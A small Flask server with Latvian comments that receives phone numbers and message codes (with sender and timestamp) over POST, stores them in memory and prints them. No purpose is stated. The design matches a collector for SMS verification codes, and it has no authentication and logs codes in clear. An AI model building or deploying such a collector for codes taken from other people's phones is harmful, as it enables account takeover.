from flask import Flask, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)

# Vienkāršs glabāšanas piemērs (tu vari pieslēgt SQLAlchemy)
received_numbers = []
received_codes = []

@app.route('/')
def index():
    return "Serveris darbojas"

@app.route('/number', methods=['POST'])
def receive_number():
    data = request.get_json()
    phone = data.get('phone')
    if not phone:
        return jsonify({'error': 'Nav telefona numura'}), 400

    received_numbers.append(phone)
    print(f"[NUMURS] Saņemts numurs: {phone}")
    return jsonify({'status': 'number saved'})

@app.route('/code', methods=['POST'])
def receive_code():
    data = request.get_json()
    code = data.get('code')
    sender = data.get('sender')
    ts = data.get('timestamp')

    if not code:
        return jsonify({'error': 'Nav koda'}), 400

    timestamp = datetime.fromtimestamp(ts / 1000) if ts else datetime.now()
    received_codes.append((code, sender, timestamp))

    print(f"[KODS] Saņemts kods: {code} no {sender} laikā {timestamp}")
    return jsonify({'status': 'code saved'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
